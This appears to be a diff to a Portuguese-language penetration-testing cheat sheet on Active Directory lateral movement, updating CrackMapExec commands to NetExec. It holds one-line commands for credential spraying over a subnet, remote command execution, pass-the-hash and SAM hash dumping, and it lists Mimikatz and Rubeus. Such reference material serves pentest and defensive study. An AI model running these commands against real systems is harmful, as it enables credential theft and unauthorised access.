@@ -254,19 +254,19 @@ dcomexec.py    # DCOM execution
 atexec.py      # Scheduled tasks
 ```
 
-### CrackMapExec
+### NetExec (ex-CrackMapExec)
 ```bash
 # Spray de credenciais
-crackmapexec smb 192.168.1.0/24 -u user -p password
+nxc smb 192.168.1.0/24 -u user -p password
 
 # Executar comando
-crackmapexec smb TARGET -u user -p password -x "whoami"
+nxc smb TARGET -u user -p password -x "whoami"
 
 # Pass-the-Hash
-crackmapexec smb TARGET -u user -H HASH -x "whoami"
+nxc smb TARGET -u user -H HASH -x "whoami"
 
 # Dump SAM
-crackmapexec smb TARGET -u user -p password --sam
+nxc smb TARGET -u user -p password --sam
 ```
 
 ### BloodHound
@@ -374,8 +374,8 @@ Red Flags:
 
 ### Ferramentas
 - Impacket
-- CrackMapExec
-- BloodHound
+- NetExec (`nxc`)
+- BloodHound CE
 - Rubeus
 - Mimikatz
 
